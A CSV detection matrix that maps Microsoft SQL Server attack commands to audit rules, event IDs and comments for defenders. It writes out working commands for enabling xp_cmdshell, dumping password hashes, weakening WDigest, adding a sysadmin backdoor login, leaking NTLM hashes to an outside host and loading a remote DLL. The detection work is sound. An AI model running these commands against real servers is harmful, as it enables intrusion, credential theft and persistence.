Phase,Category,Tool,Command,Monitoring,Config Scope,Config,Log,Attack Chain Comments,Link
1,Initial Access,sqsh,sqsh -S 192.168.3.22 -U corp1\\tboss -P admin123!,Linked to other detections.,Server,GUI based config for server logons,EVID 18453 : MSSQLSERVER Login Success For User ,Initial logon we may get some useful information for the host and IP address. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
1,Discovery,sqsh,select sysobjects.name from sysobjects where name like '%mail%',Database - Query - sysobjects - mail,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysobjects] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,An attacker can use the built in email functionality of the database to send out email. This looks for them checking to see if the mail functionality is enabled. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
1,Discovery,msfconsole,use auxiliary/admin/mssql/mssql_enum ,"Database - Query - sys.configurations
Database - Stored Procedure - xp_regread
Database - Query - master..sysdatabases
Database - Query - sys.syslogins",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[configurations] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[sysdatabases] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[sql_logins] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This Metasploit module performs a number of enumeration checks and shows an attacker other databases and information about users within the database.,https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/mssql
2,Discovery,sqsh,"EXEC sp_helprotect 'xp_dirtree'
EXEC sp_helprotect 'xp_cmdshell'",Database - Stored Procedure Execution - helprotect,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_helprotect] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Use of the sp_helprotect can be used by an attacker to see which other Stored Procedures are enabled and can be further abused.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"select * from sys.database_principals;
Invoke-Sqlcmd -Query ""select * from sys.database_principals;"" -ServerInstance ""192.168.2.149""",Database - Query - sys.database_principals,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[database_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Gets an attacker a list of all the database principals which they can then target for further exploitation. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Invoke-SQLDumpInfo -Verbose -Instance ""192.168.3.22,1433""","Database - Query - sys.database_principals
Database - Query - sys.configurations
Database - Query - sys.server_principals
Database - Stored Procedure Execution - xp_regread",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[database_principals] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[configurations] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This PowerUpSQL module performs a number of enumeration checks and shows an attacker other databases and information about users within the database.,https://github.com/NetSPI/PowerUpSQL
2,Discovery,sqsh,select * from sys.server_principals;,Database - Query - sys.server_principals,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Gets an attacker a list of all the server principals which they can then target for further exploitation. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;","Database - Query - sys.server_principals
Database - Query - password_hash",MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This query strings together information about user accounts and includes the password hash for the local accounts. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Get-SQLDomainController -Instance ""192.168.3.22,1433""","Database - Query - sys.servers
Database - Stored Procedure Execution - xp_regread",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[sysservers] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This module returns information about the Domain Controllers within the environment. ,https://github.com/NetSPI/PowerUpSQL
2,Discovery,sqsh,select loginname from master.sys.syslogins ,Database - Query - sys.syslogins,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sql_logins] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This returns all of the usernames in the database,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM sysusers,Database - Query - sysusers,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysusers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This returns all of the built in accounts within the database,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM master.INFORMATION_SCHEMA.TABLES;,Database - Recon - information_schema.tables,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[INFORMATION_SCHEMA].[TABLES] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This will return all of the table names for an attacker,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT name FROM master.dbo.sysdatabases;,Database - Recon - master..sysdatabases,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysdatabases] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker will get all of the database names with this query so they can then perform actions on each database.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM sys.servers;,Database - Recon - sys.servers,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysservers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker can gain an understanding any linked servers. Users can execute commands on linked trusted servers.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,EXEC sp_linkedservers,Database - Stored Procedure Execution - sp_linkedservers,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_linkedservers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker can gain an understanding any linked servers. Users can execute commands on linked trusted servers.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest', 'UseLogonCredential';",Database - Stored Procedure Execution - xp_regread,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,An attacker can read the entire registry from the MS-SQL server and look for well known keys that may introduce security issues such as the WDigest key. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Get-SQLServerInfo -Verbose -Instance ""192.168.3.22,1433""",Database - Stored Procedure Execution - xp_regread,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Returns information about the system that the database is running on and may allow an attacker to uncover an attack path,https://github.com/NetSPI/PowerUpSQL
3,Execution,PowerUpSQL,"Invoke-SQLOSCmdOle -Verbose -Command ""nltest"" -Instance ""192.168.3.22,1433""","Database - Config Changed - sp_configure - ole automation
Database - Stored Procedure Execution - sp_oacreate wscript",MASTER DATABASE AUDIT,"ADD (EXECUTE ON OBJECT::[dbo].[Sp_oacreate] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[sp_configure] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,Allows an attacker to execute commands via built in automation within the database,https://github.com/NetSPI/PowerUpSQL
3,Execution,sqsh,"sp_configure 'show advanced options', '1'",Database - Config Changed - sp_configure - show advanced options,MASTER DATABASE AUDIT,,EVID 33205 : SQL Audit Event - SI ,Returns information to an attacker about what is configured. This one is commonly used to see if the xp_cmdshell Stored Procedure is enabled. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,sqsh,"sp_configure 'xp_cmdshell', '1'",Database - Config Changed - sp_configure - xp_cmdshell,MASTER DATABASE AUDIT,,EVID 33205 : SQL Audit Event - SI ,This Stored Procedure can be used to turn on further functionality within a database such as xp_cmdshell.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,sqsh,CREATE LOGIN hacker123 WITH PASSWORD = 'P@ssword123!',Database - Local Account Creation,MASTER DATABASE AUDIT,,EVID 33205 : SQL Audit Event - SI ,An attacker may choose to create a separate account for persistence. They probably wont though as they will just continue to abuse the account they already have.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,sqsh,"execute as login = 'sa'
grant impersonate on login::sa to [corp1\2lo]; 
",Database - Priv Esc - Execute As Login,SERVER AUDIT,"ADD (DATABASE_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (DATABASE_PERMISSION_CHANGE_GROUP)
ADD (SCHEMA_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (SERVER_PERMISSION_CHANGE_GROUP)
ADD (DATABASE_PRINCIPAL_CHANGE_GROUP)",EVID 33205 : SQL Audit Event - SI ,An attacker can grant the impersonation right for any account to any other if they have sufficient privileges. This allows them to run commands in the context of another account.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,sqsh,SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';,Database - Query - sys.configurations,MASTER DATABASE AUDIT,,EVID 33205 : SQL Audit Event - SI ,This is another way for an attacker to check to see if a Stored Procedure is enabled. Commonly seen with xp_cmdshell.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Credential Access,PowerUpSQL,"Invoke-SQLAuditWeakLoginPw -Verbose -Instance ""192.168.3.22,1433""","Database - Query - sys.server_principals
Database - User Enumeration
Server - Internal User Enumeration","MASTER DATABASE AUDIT
Server",ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo]),"EVID 33205 : SQL Audit Event - SI
EVID 18453 : MSSQLSERVER Login Success For User ",This module attempts logins with all the local users with their username as password by default. Can uncover terrible passwords. ,https://github.com/NetSPI/PowerUpSQL
3,Credential Access,PowerUpSQL,"Get-SQLAgentJob -Verbose -Instance ""192.168.3.22,1433""","Database - Query - sysprocesses - SQL Agent
Database - Query - sysjobs - Job Enumeration",MSDB DATABASE AUDIT,"ADD (EXECUTE ON OBJECT::[dbo].[sp_add_job] BY [dbo]) 
ADD (SELECT ON OBJECT::[dbo].[sysjobs] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This returns the configuration for all the SQL Jobs which can include sensitive information in the commands being executed such as usernames and passwords. ,https://github.com/NetSPI/PowerUpSQL
3,Execution,sqsh,"EXEC sp_addsrvrolemember 'hacker12345', 'sysadmin'",Database - Stored Procedure - sp_addsrvrolemember,MASTER DATABASE AUDIT,,EVID 33205 : SQL Audit Event - SI ,This Stored Procedure adds a user account to the sysadmin group within the database. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,SQLRecon,SQLRecon.exe -a Windows -s 192.168.3.22 -m clr -o https://www.seamlessintelligence.com.au/hax/sql4.dll -f CustomFunctionName,Database - Stored Procedure Execution - sp_add_trusted_assembly,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_add_trusted_assembly] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Executes a custom DLL from a website. Dodgy.,https://github.com/skahwah/SQLRecon
3,Execution,sqsh,"EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(""os"").system(""whoami""))'",Database - Stored Procedure Execution - sp_execute_external_script,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_execute_external_script] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Allows an attacker to execute command with external scripts in a variety of languages. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,PowerUpSQL,"Invoke-SQLOSCmd -Verbose -Command ""Whoami"" -Threads 10 -Instance ""192.168.3.22,1433""",Database - Stored Procedure Execution - xp_cmdshell,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_cmdshell] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Uses the xp_cmdshell to execute commands on the server itself via Command Prompt,https://github.com/NetSPI/PowerUpSQL
3,Execution,sqsh,EXEC master..xp_cmdshell 'whoami',Database - Stored Procedure Execution - xp_cmdshell,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_cmdshell] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Uses the xp_cmdshell to execute commands on the server itself via Command Prompt,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,msfconsole,use auxiliary/admin/mssql/mssql_exec,"Database - Stored Procedure Execution - xp_cmdshell
Database - Query - sys.configurations",MASTER DATABASE AUDIT,"ADD (EXECUTE ON OBJECT::[dbo].[xp_cmdshell] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[configurations] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,Uses the xp_cmdshell to execute commands on the server itself via Command Prompt,https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/mssql
3,Credential Access,msfconsole,use auxiliary/admin/mssql/mssql_ntlm_stealer,Database - Stored Procedure Execution - xp_dirtree,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_dirtree] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Uses the dirtree Stored Procedure to try and steal the NTLM hash for the account running the SQL service,https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/mssql
3,Execution,PowerUpSQL,"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command ""nltest"" -Instance ""192.168.3.22,1433""","Database - Stored Procedure Execution - xp_regread
Database - Stored Procedure Execution - add_job
Database - Query - sysprocesses - SQL Agent",MSDB DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_add_job] BY [dbo]) ,EVID 33205 : SQL Audit Event - SI ,Uses a custom SQL job to execute commands on the server itself via Command Prompt,https://github.com/NetSPI/PowerUpSQL
3,Execution,PowerUpSQL,"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'get-smbshare"" | out-file c:\windows\temp\test2.txt' -Sleep 20 -Instance ""192.168.3.22,1433""","Database - Stored Procedure Execution - xp_regread
Database - Stored Procedure Execution - add_job
Database - Query - sysprocesses - SQL Agent",MSDB DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_add_job] BY [dbo]) ,EVID 33205 : SQL Audit Event - SI ,Uses a custom SQL job to execute commands on the server itself via PowerShell,https://github.com/NetSPI/PowerUpSQL
3,Credential Access,sqsh,"EXEC master..xp_regwrite
     @rootkey     = 'HKEY_LOCAL_MACHINE',
     @key         = 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest',
     @value_name  = 'UseLogonCredential',
     @type        = 'REG_DWORD',
     @value       = 1",Database - Stored Procedure Execution - xp_regwrite,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_regwrite] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Generally an attacker will be able to write to the OS registry from SQL and can use this to downgrade security settings. Commonly targeted is the Wdigsest key.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
3,Execution,PowerUpSQL,"Invoke-SQLOSCmdPython -Verbose -Command ""Whoami"" -Instance ""192.168.3.22,1433""",Server - Suspicious Parent Process - sqlservr,MASTER DATABASE AUDIT,N/A,EVID 4688 : Process Creation ,Uses a custom SQL job to execute commands on the server itself via the Python scripter,https://github.com/NetSPI/PowerUpSQL
4,Privilege Escalation,msfconsole,use auxiliary/admin/mssql/mssql_escalate_execute_as,"Database - Priv Esc - Execute As Login
Database - Stored Procedure Execution - sp_addsrvrolemember","MASTER DATABASE AUDIT
SERVER AUDIT","ADD (EXECUTE ON OBJECT::[dbo].[sp_addsrvrolemember] BY [dbo])
ADD (DATABASE_PRINCIPAL_IMPERSONATION_GROUP)
ADD (SERVER_PRINCIPAL_IMPERSONATION_GROUP)",EVID 33205 : SQL Audit Event - SI ,Attempts to escalate the session to an admin user which allows for executing commands within the database as an admin user. ,https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/mssql
4,Privilege Escalation,sqsh,grant impersonate on login::sa to [corp1\2lo]; ,Database - Priv Esc - Grant Impersonate On,SERVER AUDIT,"ADD (DATABASE_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (DATABASE_PERMISSION_CHANGE_GROUP)
ADD (SCHEMA_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP)
ADD (SERVER_PERMISSION_CHANGE_GROUP)
ADD (DATABASE_PRINCIPAL_CHANGE_GROUP)",EVID 33205 : SQL Audit Event - SI ,An attacker may grant the ability to impersonate other users such as the sa account in order to mask where the execution is coming from,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
4,Privilege Escalation,sqsh,exec master.dbo.xp_dirtree '\\10.1.1.60\any\thing',Database - Stored Procedure Execution - xp_dirtree,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_dirtree] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,The xp_dirtree Stored Procedure can be abused to leak the NTLM hash of the account running the SQL service,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
5,Persistence,sqsh,"CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';EXEC sp_addsrvrolemember 'hacker', 'sysadmin'","Database - Local Account Creation
Database - Stored Procedure Execution - sp_addsrvrolemember",MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_addsrvrolemember] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,An attacker may choose to create a separate account for persistence. They probably wont though as they will just continue to abuse the account they already have.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
